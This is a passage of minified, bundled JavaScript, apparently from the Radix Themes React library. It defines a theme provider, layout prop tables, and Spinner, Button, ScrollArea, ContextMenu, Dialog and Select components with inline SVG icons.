    case "jade":
    case "mint":
    case "green":
        return "sage";
    case "grass":
    case "lime":
        return "olive";
    case "yellow":
    case "amber":
    case "orange":
    case "brown":
    case "gold":
    case "bronze":
        return "sand";
    case "gray":
        return "gray"
    }
}
const e$8 = ["none", "small", "medium", "large", "full"]
  , r$9 = {
    radius: {
        type: "enum",
        values: e$8,
        default: void 0
    }
}
  , s$4 = {
    hasBackground: {
        default: !0
    },
    appearance: {
        default: "inherit"
    },
    accentColor: {
        default: "indigo"
    },
    grayColor: {
        default: "auto"
    },
    panelBackground: {
        default: "translucent"
    },
    radius: {
        default: "medium"
    },
    scaling: {
        default: "100%"
    }
}
  , d$2 = () => {}
  , P = reactExports.createContext(void 0);
function H() {
    const _ = reactExports.useContext(P);
    if (_ === void 0)
        throw new Error("`useThemeContext` must be used within a `Theme`");
    return _
}
const R$1 = reactExports.forwardRef( (_, M) => reactExports.useContext(P) === void 0 ? reactExports.createElement(Provider, {
    delayDuration: 200
}, reactExports.createElement(Provider$1, {
    dir: "ltr"
}, reactExports.createElement(I$1, {
    ..._,
    ref: M
}))) : reactExports.createElement(A, {
    ..._,
    ref: M
}));
R$1.displayName = "Theme";
const I$1 = reactExports.forwardRef( (_, M) => {
    const {appearance: j=s$4.appearance.default, accentColor: O=s$4.accentColor.default, grayColor: x=s$4.grayColor.default, panelBackground: w=s$4.panelBackground.default, radius: b=s$4.radius.default, scaling: X=s$4.scaling.default, hasBackground: Y=s$4.hasBackground.default, ...F} = _
      , [V,K] = reactExports.useState(j);
    reactExports.useEffect( () => K(j), [j]);
    const [Q,ee] = reactExports.useState(O);
    reactExports.useEffect( () => ee(O), [O]);
    const [ae,ne] = reactExports.useState(x);
    reactExports.useEffect( () => ne(x), [x]);
    const [oe,ue] = reactExports.useState(w);
    reactExports.useEffect( () => ue(w), [w]);
    const [fe,he] = reactExports.useState(b);
    reactExports.useEffect( () => he(b), [b]);
    const [pe,ye] = reactExports.useState(X);
    return reactExports.useEffect( () => ye(X), [X]),
    reactExports.createElement(A, {
        ...F,
        ref: M,
        isRoot: !0,
        hasBackground: Y,
        appearance: V,
        accentColor: Q,
        grayColor: ae,
        panelBackground: oe,
        radius: fe,
        scaling: pe,
        onAppearanceChange: K,
        onAccentColorChange: ee,
        onGrayColorChange: ne,
        onPanelBackgroundChange: ue,
        onRadiusChange: he,
        onScalingChange: ye
    })
}
);
I$1.displayName = "ThemeRoot";
const A = reactExports.forwardRef( (_, M) => {
    const j = reactExports.useContext(P)
      , {asChild: O, isRoot: x, hasBackground: w, appearance: b=(j == null ? void 0 : j.appearance) ?? s$4.appearance.default, accentColor: X=(j == null ? void 0 : j.accentColor) ?? s$4.accentColor.default, grayColor: Y=(j == null ? void 0 : j.resolvedGrayColor) ?? s$4.grayColor.default, panelBackground: F=(j == null ? void 0 : j.panelBackground) ?? s$4.panelBackground.default, radius: V=(j == null ? void 0 : j.radius) ?? s$4.radius.default, scaling: K=(j == null ? void 0 : j.scaling) ?? s$4.scaling.default, onAppearanceChange: Q=d$2, onAccentColorChange: ee=d$2, onGrayColorChange: ae=d$2, onPanelBackgroundChange: ne=d$2, onRadiusChange: oe=d$2, onScalingChange: ue=d$2, ...fe} = _
      , he = O ? Slot$3 : "div"
      , pe = Y === "auto" ? a$7(X) : Y
      , ye = _.appearance === "light" || _.appearance === "dark"
      , be = w === void 0 ? x || ye : w;
    return reactExports.createElement(P.Provider, {
        value: reactExports.useMemo( () => ({
            appearance: b,
            accentColor: X,
            grayColor: Y,
            resolvedGrayColor: pe,
            panelBackground: F,
            radius: V,
            scaling: K,
            onAppearanceChange: Q,
            onAccentColorChange: ee,
            onGrayColorChange: ae,
            onPanelBackgroundChange: ne,
            onRadiusChange: oe,
            onScalingChange: ue
        }), [b, X, Y, pe, F, V, K, Q, ee, ae, ne, oe, ue])
    }, reactExports.createElement(he, {
        "data-is-root-theme": x ? "true" : "false",
        "data-accent-color": X,
        "data-gray-color": pe,
        "data-has-background": be ? "true" : "false",
        "data-panel-background": F,
        "data-radius": V,
        "data-scaling": K,
        ref: M,
        ...fe,
        className: y$2("radix-themes", {
            light: b === "light",
            dark: b === "dark"
        }, fe.className)
    }))
}
);
A.displayName = "ThemeImpl";
const a$6 = _ => {
    if (!reactExports.isValidElement(_))
        throw Error(`Expected a single React Element child, but got: ${reactExports.Children.toArray(_).map(M => typeof M == "object" && "type"in M && typeof M.type == "string" ? M.type : typeof M).join(", ")}`);
    return _
}
;
function d$1(_, M) {
    const {asChild: j, children: O} = _;
    if (!j)
        return typeof M == "function" ? M(O) : M;
    const x = reactExports.Children.only(O);
    return reactExports.cloneElement(x, {
        children: typeof M == "function" ? M(x.props.children) : M
    })
}
const e$7 = Slot$3
  , e$6 = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]
  , p$7 = {
    p: {
        type: "enum | string",
        className: "rt-r-p",
        customProperties: ["--p"],
        values: e$6,
        responsive: !0
    },
    px: {
        type: "enum | string",
        className: "rt-r-px",
        customProperties: ["--pl", "--pr"],
        values: e$6,
        responsive: !0
    },
    py: {
        type: "enum | string",
        className: "rt-r-py",
        customProperties: ["--pt", "--pb"],
        values: e$6,
        responsive: !0
    },
    pt: {
        type: "enum | string",
        className: "rt-r-pt",
        customProperties: ["--pt"],
        values: e$6,
        responsive: !0
    },
    pr: {
        type: "enum | string",
        className: "rt-r-pr",
        customProperties: ["--pr"],
        values: e$6,
        responsive: !0
    },
    pb: {
        type: "enum | string",
        className: "rt-r-pb",
        customProperties: ["--pb"],
        values: e$6,
        responsive: !0
    },
    pl: {
        type: "enum | string",
        className: "rt-r-pl",
        customProperties: ["--pl"],
        values: e$6,
        responsive: !0
    }
}
  , r$8 = ["visible", "hidden", "clip", "scroll", "auto"]
  , i$6 = ["static", "relative", "absolute", "fixed", "sticky"]
  , e$5 = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "-1", "-2", "-3", "-4", "-5", "-6", "-7", "-8", "-9"]
  , p$6 = ["0", "1"]
  , n$5 = ["0", "1"]
  , u$3 = {
    ...p$7,
    ...t$8,
    ...e$h,
    position: {
        type: "enum",
        className: "rt-r-position",
        values: i$6,
        responsive: !0
    },
    inset: {
        type: "enum | string",
        className: "rt-r-inset",
        customProperties: ["--inset"],
        values: e$5,
        responsive: !0
    },
    top: {
        type: "enum | string",
        className: "rt-r-top",
        customProperties: ["--top"],
        values: e$5,
        responsive: !0
    },
    right: {
        type: "enum | string",
        className: "rt-r-right",
        customProperties: ["--right"],
        values: e$5,
        responsive: !0
    },
    bottom: {
        type: "enum | string",
        className: "rt-r-bottom",
        customProperties: ["--bottom"],
        values: e$5,
        responsive: !0
    },
    left: {
        type: "enum | string",
        className: "rt-r-left",
        customProperties: ["--left"],
        values: e$5,
        responsive: !0
    },
    overflow: {
        type: "enum",
        className: "rt-r-overflow",
        values: r$8,
        responsive: !0
    },
    overflowX: {
        type: "enum",
        className: "rt-r-ox",
        values: r$8,
        responsive: !0
    },
    overflowY: {
        type: "enum",
        className: "rt-r-oy",
        values: r$8,
        responsive: !0
    },
    flexBasis: {
        type: "string",
        className: "rt-r-fb",
        customProperties: ["--flex-basis"],
        responsive: !0
    },
    flexShrink: {
        type: "enum | string",
        className: "rt-r-fs",
        customProperties: ["--flex-shrink"],
        values: p$6,
        responsive: !0
    },
    flexGrow: {
        type: "enum | string",
        className: "rt-r-fg",
        customProperties: ["--flex-grow"],
        values: n$5,
        responsive: !0
    },
    gridArea: {
        type: "string",
        className: "rt-r-ga",
        customProperties: ["--grid-area"],
        responsive: !0
    },
    gridColumn: {
        type: "string",
        className: "rt-r-gc",
        customProperties: ["--grid-column"],
        responsive: !0
    },
    gridColumnStart: {
        type: "string",
        className: "rt-r-gcs",
        customProperties: ["--grid-column-start"],
        responsive: !0
    },
    gridColumnEnd: {
        type: "string",
        className: "rt-r-gce",
        customProperties: ["--grid-column-end"],
        responsive: !0
    },
    gridRow: {
        type: "string",
        className: "rt-r-gr",
        customProperties: ["--grid-row"],
        responsive: !0
    },
    gridRowStart: {
        type: "string",
        className: "rt-r-grs",
        customProperties: ["--grid-row-start"],
        responsive: !0
    },
    gridRowEnd: {
        type: "string",
        className: "rt-r-gre",
        customProperties: ["--grid-row-end"],
        responsive: !0
    }
}
  , t$5 = ["1", "2", "3", "4"]
  , a$5 = ["classic", "solid", "soft", "surface", "outline", "ghost"]
  , i$5 = {
    ...o$8,
    size: {
        type: "enum",
        className: "rt-r-size",
        values: t$5,
        default: "2",
        responsive: !0
    },
    variant: {
        type: "enum",
        className: "rt-variant",
        values: a$5,
        default: "solid"
    },
    ...s$5,
    ...o$6,
    ...r$9,
    loading: {
        type: "boolean",
        className: "rt-loading",
        default: !1
    }
}
  , e$4 = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]
  , p$5 = {
    gap: {
        type: "enum | string",
        className: "rt-r-gap",
        customProperties: ["--gap"],
        values: e$4,
        responsive: !0
    },
    gapX: {
        type: "enum | string",
        className: "rt-r-cg",
        customProperties: ["--column-gap"],
        values: e$4,
        responsive: !0
    },
    gapY: {
        type: "enum | string",
        className: "rt-r-rg",
        customProperties: ["--row-gap"],
        values: e$4,
        responsive: !0
    }
}
  , t$4 = ["div", "span"]
  , p$4 = ["none", "inline-flex", "flex"]
  , a$4 = ["row", "column", "row-reverse", "column-reverse"]
  , o$5 = ["start", "center", "end", "baseline", "stretch"]
  , n$4 = ["start", "center", "end", "between"]
  , l$1 = ["nowrap", "wrap", "wrap-reverse"]
  , u$2 = {
    as: {
        type: "enum",
        values: t$4,
        default: "div"
    },
    ...o$8,
    display: {
        type: "enum",
        className: "rt-r-display",
        values: p$4,
        responsive: !0
    },
    direction: {
        type: "enum",
        className: "rt-r-fd",
        values: a$4,
        responsive: !0
    },
    align: {
        type: "enum",
        className: "rt-r-ai",
        values: o$5,
        responsive: !0
    },
    justify: {
        type: "enum",
        className: "rt-r-jc",
        values: n$4,
        parseValue: f$2,
        responsive: !0
    },
    wrap: {
        type: "enum",
        className: "rt-r-fw",
        values: l$1,
        responsive: !0
    },
    ...p$5
};
function f$2(_) {
    return _ === "between" ? "space-between" : _
}
const p$3 = reactExports.forwardRef( (_, M) => {
    const {className: j, asChild: O, as: x="div", ...w} = v$2(_, u$2, u$3, r$b);
    return reactExports.createElement(O ? e$7 : x, {
        ...w,
        ref: M,
        className: y$2("rt-Flex", j)
    })
}
);
p$3.displayName = "Flex";
const e$3 = ["1", "2", "3"]
  , s$3 = {
    size: {
        type: "enum",
        className: "rt-r-size",
        values: e$3,
        default: "2",
        responsive: !0
    },
    loading: {
        type: "boolean",
        default: !0
    }
}
  , s$2 = reactExports.forwardRef( (_, M) => {
    const {className: j, children: O, loading: x, ...w} = v$2(_, s$3, r$b);
    if (!x)
        return O;
    const b = reactExports.createElement("span", {
        ...w,
        ref: M,
        className: y$2("rt-Spinner", j)
    }, reactExports.createElement("span", {
        className: "rt-SpinnerLeaf"
    }), reactExports.createElement("span", {
        className: "rt-SpinnerLeaf"
    }), reactExports.createElement("span", {
        className: "rt-SpinnerLeaf"
    }), reactExports.createElement("span", {
        className: "rt-SpinnerLeaf"
    }), reactExports.createElement("span", {
        className: "rt-SpinnerLeaf"
    }), reactExports.createElement("span", {
        className: "rt-SpinnerLeaf"
    }), reactExports.createElement("span", {
        className: "rt-SpinnerLeaf"
    }), reactExports.createElement("span", {
        className: "rt-SpinnerLeaf"
    }));
    return O === void 0 ? b : reactExports.createElement(p$3, {
        asChild: !0,
        position: "relative",
        align: "center",
        justify: "center"
    }, reactExports.createElement("span", null, reactExports.createElement("span", {
        "aria-hidden": !0,
        style: {
            display: "contents",
            visibility: "hidden"
        },
        inert: void 0
    }, O), reactExports.createElement(p$3, {
        asChild: !0,
        align: "center",
        justify: "center",
        position: "absolute",
        inset: "0"
    }, reactExports.createElement("span", null, b))))
}
);
s$2.displayName = "Spinner";
const d = Root$4;
function s$1(_, M) {
    if (_ !== void 0)
        return typeof _ == "string" ? M(_) : Object.fromEntries(Object.entries(_).map( ([j,O]) => [j, M(O)]))
}
function r$7(_) {
    switch (_) {
    case "1":
        return "1";
    case "2":
    case "3":
        return "2";
    case "4":
        return "3"
    }
}
const n$3 = reactExports.forwardRef( (_, M) => {
    const {size: j=i$5.size.default} = _
      , {className: O, children: x, asChild: w, color: b, radius: X, disabled: Y=_.loading, ...F} = v$2(_, i$5, r$b)
      , V = w ? Slot$3 : "button";
    return reactExports.createElement(V, {
        "data-disabled": Y || void 0,
        "data-accent-color": b,
        "data-radius": X,
        ...F,
        ref: M,
        className: y$2("rt-reset", "rt-BaseButton", O),
        disabled: Y
    }, _.loading ? reactExports.createElement(reactExports.Fragment, null, reactExports.createElement("span", {
        style: {
            display: "contents",
            visibility: "hidden"
        },
        "aria-hidden": !0
    }, x), reactExports.createElement(d, null, x), reactExports.createElement(p$3, {
        asChild: !0,
        align: "center",
        justify: "center",
        position: "absolute",
        inset: "0"
    }, reactExports.createElement("span", null, reactExports.createElement(s$2, {
        size: s$1(j, r$7)
    })))) : x)
}
);
n$3.displayName = "BaseButton";
const o$4 = reactExports.forwardRef( ({className: _, ...M}, j) => reactExports.createElement(n$3, {
    ...M,
    ref: j,
    className: y$2("rt-Button", _)
}));
o$4.displayName = "Button";
var Primitive = Primitive$1;
Primitive.dispatchDiscreteCustomEvent = dispatchDiscreteCustomEvent;
Primitive.Root = Primitive$1;
const r$6 = React.forwardRef( (_, M) => React.createElement("svg", {
    width: "9",
    height: "9",
    viewBox: "0 0 9 9",
    fill: "currentcolor",
    xmlns: "http://www.w3.org/2000/svg",
    ..._,
    ref: M
}, React.createElement("path", {
    fillRule: "evenodd",
    clipRule: "evenodd",
    d: "M0.75 4.5C0.75 4.08579 1.08579 3.75 1.5 3.75H7.5C7.91421 3.75 8.25 4.08579 8.25 4.5C8.25 4.91421 7.91421 5.25 7.5 5.25H1.5C1.08579 5.25 0.75 4.91421 0.75 4.5Z"
})));
r$6.displayName = "ThickDividerHorizontalIcon";
const t$3 = React.forwardRef( (_, M) => React.createElement("svg", {
    width: "9",
    height: "9",
    viewBox: "0 0 9 9",
    fill: "currentcolor",
    xmlns: "http://www.w3.org/2000/svg",
    ..._,
    ref: M
}, React.createElement("path", {
    fillRule: "evenodd",
    clipRule: "evenodd",
    d: "M8.53547 0.62293C8.88226 0.849446 8.97976 1.3142 8.75325 1.66099L4.5083 8.1599C4.38833 8.34356 4.19397 8.4655 3.9764 8.49358C3.75883 8.52167 3.53987 8.45309 3.3772 8.30591L0.616113 5.80777C0.308959 5.52987 0.285246 5.05559 0.563148 4.74844C0.84105 4.44128 1.31533 4.41757 1.62249 4.69547L3.73256 6.60459L7.49741 0.840706C7.72393 0.493916 8.18868 0.396414 8.53547 0.62293Z"
})));
t$3.displayName = "ThickCheckIcon";
const i$4 = React.forwardRef( (_, M) => React.createElement("svg", {
    width: "9",
    height: "9",
    viewBox: "0 0 9 9",
    fill: "currentcolor",
    xmlns: "http://www.w3.org/2000/svg",
    ..._,
    ref: M
}, React.createElement("path", {
    d: "M0.135232 3.15803C0.324102 2.95657 0.640521 2.94637 0.841971 3.13523L4.5 6.56464L8.158 3.13523C8.3595 2.94637 8.6759 2.95657 8.8648 3.15803C9.0536 3.35949 9.0434 3.67591 8.842 3.86477L4.84197 7.6148C4.64964 7.7951 4.35036 7.7951 4.15803 7.6148L0.158031 3.86477C-0.0434285 3.67591 -0.0536285 3.35949 0.135232 3.15803Z"
})));
i$4.displayName = "ChevronDownIcon";
const l = React.forwardRef( (_, M) => React.createElement("svg", {
    width: "9",
    height: "9",
    viewBox: "0 0 9 9",
    fill: "currentcolor",
    xmlns: "http://www.w3.org/2000/svg",
    ..._,
    ref: M
}, React.createElement("path", {
    fillRule: "evenodd",
    clipRule: "evenodd",
    d: "M3.23826 0.201711C3.54108 -0.0809141 4.01567 -0.0645489 4.29829 0.238264L7.79829 3.98826C8.06724 4.27642 8.06724 4.72359 7.79829 5.01174L4.29829 8.76174C4.01567 9.06455 3.54108 9.08092 3.23826 8.79829C2.93545 8.51567 2.91909 8.04108 3.20171 7.73826L6.22409 4.5L3.20171 1.26174C2.91909 0.958928 2.93545 0.484337 3.23826 0.201711Z"
})));
l.displayName = "ThickChevronRightIcon";
const r$5 = ["1", "2", "3"]
  , t$2 = {
    ...o$8,
    size: {
        values: r$5,
        default: "1"
    },
    ...r$9,
    scrollbars: {
        default: "both"
    }
};
function a$3(_) {
    const {m: M, mx: j, my: O, mt: x, mr: w, mb: b, ml: X, ...Y} = _;
    return {
        m: M,
        mx: j,
        my: O,
        mt: x,
        mr: w,
        mb: b,
        ml: X,
        rest: Y
    }
}
const r$4 = r$b.m.values;
function S$1(_) {
    const [M,j] = R$2({
        className: "rt-r-m",
        customProperties: ["--margin"],
        propValues: r$4,
        value: _.m
    })
      , [O,x] = R$2({
        className: "rt-r-mx",
        customProperties: ["--margin-left", "--margin-right"],
        propValues: r$4,
        value: _.mx
    })
      , [w,b] = R$2({
        className: "rt-r-my",
        customProperties: ["--margin-top", "--margin-bottom"],
        propValues: r$4,
        value: _.my
    })
      , [X,Y] = R$2({
        className: "rt-r-mt",
        customProperties: ["--margin-top"],
        propValues: r$4,
        value: _.mt
    })
      , [F,V] = R$2({
        className: "rt-r-mr",
        customProperties: ["--margin-right"],
        propValues: r$4,
        value: _.mr
    })
      , [K,Q] = R$2({
        className: "rt-r-mb",
        customProperties: ["--margin-bottom"],
        propValues: r$4,
        value: _.mb
    })
      , [ee,ae] = R$2({
        className: "rt-r-ml",
        customProperties: ["--margin-left"],
        propValues: r$4,
        value: _.ml
    });
    return [y$2(M, O, w, X, F, K, ee), l$2(j, x, b, Y, V, Q, ae)]
}
const c$1 = reactExports.forwardRef( (_, M) => {
    const {rest: j, ...O} = a$3(_)
      , [x,w] = S$1(O)
      , {asChild: b, children: X, className: Y, style: F, type: V, scrollHideDelay: K=V !== "scroll" ? 0 : void 0, dir: Q, size: ee=t$2.size.default, radius: ae=t$2.radius.default, scrollbars: ne=t$2.scrollbars.default, ...oe} = j;
    return reactExports.createElement(Root, {
        type: V,
        scrollHideDelay: K,
        className: y$2("rt-ScrollAreaRoot", x, Y),
        style: l$2(w, F),
        asChild: b
    }, d$1({
        asChild: b,
        children: X
    }, ue => reactExports.createElement(reactExports.Fragment, null, reactExports.createElement(Viewport$1, {
        ...oe,
        ref: M,
        className: "rt-ScrollAreaViewport"
    }, ue), reactExports.createElement("div", {
        className: "rt-ScrollAreaViewportFocusRing"
    }), ne !== "vertical" ? reactExports.createElement(Scrollbar, {
        "data-radius": ae,
        orientation: "horizontal",
        className: y$2("rt-ScrollAreaScrollbar", g$3({
            className: "rt-r-size",
            value: ee,
            propValues: t$2.size.values
        }))
    }, reactExports.createElement(Thumb, {
        className: "rt-ScrollAreaThumb"
    })) : null, ne !== "horizontal" ? reactExports.createElement(Scrollbar, {
        "data-radius": ae,
        orientation: "vertical",
        className: y$2("rt-ScrollAreaScrollbar", g$3({
            className: "rt-r-size",
            value: ee,
            propValues: t$2.size.values
        }))
    }, reactExports.createElement(Thumb, {
        className: "rt-ScrollAreaThumb"
    })) : null, ne === "both" ? reactExports.createElement(Corner, {
        className: "rt-ScrollAreaCorner"
    }) : null)))
}
);
c$1.displayName = "ScrollArea";
const o$3 = ["1", "2"]
  , r$3 = ["solid", "soft"]
  , n$2 = {
    size: {
        type: "enum",
        className: "rt-r-size",
        values: o$3,
        default: "2",
        responsive: !0
    },
    variant: {
        type: "enum",
        className: "rt-variant",
        values: r$3,
        default: "solid"
    },
    ...r$e,
    ...o$6
}
  , a$2 = {
    ...o$8,
    ...r$e
}
  , i$3 = {
    ...r$e
}
  , p$2 = {
    ...r$e
}
  , S = reactExports.forwardRef( ({children: _, ...M}, j) => reactExports.createElement(Trigger$2, {
    ...M,
    ref: j,
    asChild: !0
}, a$6(_)));
S.displayName = "ContextMenu.Trigger";
const g$2 = reactExports.createContext({})
  , v$1 = reactExports.forwardRef( (_, M) => {
    const j = H()
      , {size: O=n$2.size.default, variant: x=n$2.variant.default, highContrast: w=n$2.highContrast.default} = _
      , {className: b, children: X, color: Y, container: F, forceMount: V, ...K} = v$2(_, n$2)
      , Q = Y || j.accentColor;
    return reactExports.createElement(Portal2, {
        container: F,
        forceMount: V
    }, reactExports.createElement(R$1, {
        asChild: !0
    }, reactExports.createElement(Content2$2, {
        "data-accent-color": Q,
        alignOffset: -Number(O) * 4,
        collisionPadding: 10,
        ...K,
        asChild: !1,
        ref: M,
        className: y$2("rt-PopperContent", "rt-BaseMenuContent", "rt-ContextMenuContent", b)
    }, reactExports.createElement(c$1, {
        type: "auto"
    }, reactExports.createElement("div", {
        className: y$2("rt-BaseMenuViewport", "rt-ContextMenuViewport")
    }, reactExports.createElement(g$2.Provider, {
        value: reactExports.useMemo( () => ({
            size: O,
            variant: x,
            color: Q,
            highContrast: w
        }), [O, x, Q, w])
    }, X))))))
}
);
v$1.displayName = "ContextMenu.Content";
const y$1 = reactExports.forwardRef( ({className: _, ...M}, j) => reactExports.createElement(Label2, {
    ...M,
    asChild: !1,
    ref: j,
    className: y$2("rt-BaseMenuLabel", "rt-ContextMenuLabel", _)
}));
y$1.displayName = "ContextMenu.Label";
const R = reactExports.forwardRef( (_, M) => {
    const {className: j, children: O, color: x=a$2.color.default, shortcut: w, ...b} = _;
    return reactExports.createElement(Item2, {
        "data-accent-color": x,
        ...b,
        ref: M,
        className: y$2("rt-reset", "rt-BaseMenuItem", "rt-ContextMenuItem", j)
    }, reactExports.createElement(Slottable$1, null, O), w && reactExports.createElement("div", {
        className: "rt-BaseMenuShortcut rt-ContextMenuShortcut"
    }, w))
}
);
R.displayName = "ContextMenu.Item";
const N = reactExports.forwardRef( ({className: _, ...M}, j) => reactExports.createElement(Group2, {
    ...M,
    asChild: !1,
    ref: j,
    className: y$2("rt-BaseMenuGroup", "rt-ContextMenuGroup", _)
}));
N.displayName = "ContextMenu.Group";
const T = reactExports.forwardRef( ({className: _, ...M}, j) => reactExports.createElement(RadioGroup2, {
    ...M,
    asChild: !1,
    ref: j,
    className: y$2("rt-BaseMenuRadioGroup", "rt-ContextMenuRadioGroup", _)
}));
T.displayName = "ContextMenu.RadioGroup";
const E = reactExports.forwardRef( (_, M) => {
    const {children: j, className: O, color: x=p$2.color.default, ...w} = _;
    return reactExports.createElement(RadioItem2, {
        ...w,
        asChild: !1,
        ref: M,
        "data-accent-color": x,
        className: y$2("rt-BaseMenuItem", "rt-BaseMenuRadioItem", "rt-ContextMenuItem", "rt-ContextMenuRadioItem", O)
    }, reactExports.createElement(Slottable$1, null, j), reactExports.createElement(ItemIndicator2, {
        className: "rt-BaseMenuItemIndicator rt-ContextMenuItemIndicator"
    }, reactExports.createElement(t$3, {
        className: "rt-BaseMenuItemIndicatorIcon rt-ContextMenuItemIndicatorIcon"
    })))
}
);
E.displayName = "ContextMenu.RadioItem";
const G = reactExports.forwardRef( (_, M) => {
    const {children: j, className: O, shortcut: x, color: w=i$3.color.default, ...b} = _;
    return reactExports.createElement(CheckboxItem2, {
        ...b,
        asChild: !1,
        ref: M,
        "data-accent-color": w,
        className: y$2("rt-BaseMenuItem", "rt-BaseMenuCheckboxItem", "rt-ContextMenuItem", "rt-ContextMenuCheckboxItem", O)
    }, reactExports.createElement(Slottable$1, null, j), reactExports.createElement(ItemIndicator2, {
        className: "rt-BaseMenuItemIndicator rt-ContextMenuItemIndicator"
    }, reactExports.createElement(t$3, {
        className: "rt-BaseMenuItemIndicatorIcon rt-ContextMenuItemIndicatorIcon"
    })), x && reactExports.createElement("div", {
        className: "rt-BaseMenuShortcut rt-ContextMenuShortcut"
    }, x))
}
);
G.displayName = "ContextMenu.CheckboxItem";
const B = reactExports.forwardRef( (_, M) => {
    const {className: j, children: O, ...x} = _;
    return reactExports.createElement(SubTrigger2, {
        ...x,
        asChild: !1,
        ref: M,
        className: y$2("rt-BaseMenuItem", "rt-BaseMenuSubTrigger", "rt-ContextMenuItem", "rt-ContextMenuSubTrigger", j)
    }, O, reactExports.createElement("div", {
        className: "rt-BaseMenuShortcut rt-ContextMenuShortcut"
    }, reactExports.createElement(l, {
        className: "rt-BaseMenuSubTriggerIcon rt-ContextMenuSubTriggerIcon"
    })))
}
);
B.displayName = "ContextMenu.SubTrigger";
const k = reactExports.forwardRef( (_, M) => {
    const {size: j, variant: O, color: x, highContrast: w} = reactExports.useContext(g$2)
      , {className: b, children: X, container: Y, forceMount: F, ...V} = v$2({
        size: j,
        variant: O,
        color: x,
        highContrast: w,
        ..._
    }, n$2);
    return reactExports.createElement(Portal2, {
        container: Y,
        forceMount: F
    }, reactExports.createElement(R$1, {
        asChild: !0
    }, reactExports.createElement(SubContent2, {
        "data-accent-color": x,
        alignOffset: -Number(j) * 4,
        sideOffset: 1,
        collisionPadding: 10,
        ...V,
        asChild: !1,
        ref: M,
        className: y$2("rt-PopperContent", "rt-BaseMenuContent", "rt-BaseMenuSubContent", "rt-ContextMenuContent", "rt-ContextMenuSubContent", b)
    }, reactExports.createElement(c$1, {
        type: "auto"
    }, reactExports.createElement("div", {
        className: y$2("rt-BaseMenuViewport", "rt-ContextMenuViewport")
    }, X)))))
}
);
k.displayName = "ContextMenu.SubContent";
const W = reactExports.forwardRef( ({className: _, ...M}, j) => reactExports.createElement(Separator2, {
    ...M,
    asChild: !1,
    ref: j,
    className: y$2("rt-BaseMenuSeparator", "rt-ContextMenuSeparator", _)
}));
W.displayName = "ContextMenu.Separator";
const s = _ => reactExports.createElement(Root$3, {
    ..._,
    modal: !0
});
s.displayName = "Dialog.Root";
const n$1 = reactExports.forwardRef( ({children: _, ...M}, j) => reactExports.createElement(Trigger$3, {
    ...M,
    ref: j,
    asChild: !0
}, a$6(_)));
n$1.displayName = "Dialog.Trigger";
const p$1 = reactExports.forwardRef( ({align: _, ...M}, j) => {
    const {align: O, ...x} = s$6
      , {className: w} = v$2({
        align: _
    }, {
        align: O
    })
      , {className: b, forceMount: X, container: Y, ...F} = v$2(M, x);
    return reactExports.createElement(Portal$3, {
        container: Y,
        forceMount: X
    }, reactExports.createElement(R$1, {
        asChild: !0
    }, reactExports.createElement(Overlay, {
        className: "rt-BaseDialogOverlay rt-DialogOverlay"
    }, reactExports.createElement("div", {
        className: "rt-BaseDialogScroll rt-DialogScroll"
    }, reactExports.createElement("div", {
        className: `rt-BaseDialogScrollPadding rt-DialogScrollPadding ${w}`
    }, reactExports.createElement(Content$1, {
        ...F,
        ref: j,
        className: y$2("rt-BaseDialogContent", "rt-DialogContent", b)
    }))))))
}
);
p$1.displayName = "Dialog.Content";
const g$1 = reactExports.forwardRef( (_, M) => reactExports.createElement(Title, {
    asChild: !0
}, reactExports.createElement(r$a, {
    size: "5",
    mb: "3",
    trim: "start",
    ..._,
    asChild: !1,
    ref: M
})));
g$1.displayName = "Dialog.Title";
const m = reactExports.forwardRef( (_, M) => reactExports.createElement(Description, {
    asChild: !0
}, reactExports.createElement(p$8, {
    as: "p",
    size: "3",
    ..._,
    asChild: !1,
    ref: M
})));
m.displayName = "Dialog.Description";
const D = reactExports.forwardRef( ({children: _, ...M}, j) => reactExports.createElement(Close, {
    ...M,
    ref: j,
    asChild: !0
}, a$6(_)));
D.displayName = "Dialog.Close";
const o$2 = reactExports.forwardRef( ({className: _, ...M}, j) => reactExports.createElement(n$3, {
    ...M,
    ref: j,
    className: y$2("rt-IconButton", _)
}));
o$2.displayName = "IconButton";
const r$2 = ["1", "2", "3"]
  , o$1 = {
    size: {
        type: "enum",
        className: "rt-r-size",
        values: r$2,
        default: "2",
        responsive: !0
    }
}
  , a$1 = ["classic", "surface", "soft", "ghost"]
  , i$2 = {
    variant: {
        type: "enum",
        className: "rt-variant",
        values: a$1,
        default: "surface"
    },
    ...r$e,
    ...r$9,
    placeholder: {
        type: "string"
    }
}
  , n = ["solid", "soft"]
  , p = {
    variant: {
        type: "enum",
        className: "rt-variant",
        values: n,
        default: "solid"
    },
    ...r$e,
    ...o$6
}
  , f$1 = reactExports.createContext({})
  , C = _ => {
    const {children: M, size: j=o$1.size.default, ...O} = _;
    return reactExports.createElement(Root2, {
        ...O
    }, reactExports.createElement(f$1.Provider, {
        value: reactExports.useMemo( () => ({
            size: j
        }), [j])
    }, M))
}
;
C.displayName = "Select.Root";
const u$1 = reactExports.forwardRef( (_, M) => {
    const j = reactExports.useContext(f$1)
      , {children: O, className: x, color: w, radius: b, placeholder: X, ...Y} = v$2({
        size: j == null ? void 0 : j.size,
        ..._
    }, {
        size: o$1.size
    }, i$2, r$b);
    return reactExports.createElement(Trigger$1, {
        asChild: !0
    }, reactExports.createElement("button", {
        "data-accent-color": w,
        "data-radius": b,
        ...Y,
        ref: M,
        className: y$2("rt-reset", "rt-SelectTrigger", x)
    }, reactExports.createElement("span", {
        className: "rt-SelectTriggerInner"
    }, reactExports.createElement(Value, {
        placeholder: X
    }, O)), reactExports.createElement(Icon, {
        asChild: !0
    }, reactExports.createElement(i$4, {
        className: "rt-SelectIcon"
    }))))
}
);
u$1.displayName = "Select.Trigger";
const g = reactExports.forwardRef( (_, M) => {
    const j = reactExports.useContext(f$1)
      , {className: O, children: x, color: w, container: b, ...X} = v$2({
        size: j == null ? void 0 : j.size,
        ..._
    }, {
        size: o$1.size
    }, p)
      , Y = H()
      , F = w || Y.accentColor;
    return reactExports.createElement(Portal$1, {
        container: b
    }, reactExports.createElement(R$1, {
        asChild: !0
    }, reactExports.createElement(Content2$1, {
        "data-accent-color": F,
        sideOffset: 4,
        ...X,
        asChild: !1,
        ref: M,
        className: y$2({
            "rt-PopperContent": X.position === "popper"
        }, "rt-SelectContent", O)
    }, reactExports.createElement(Root, {
        type: "auto",
        className: "rt-ScrollAreaRoot"
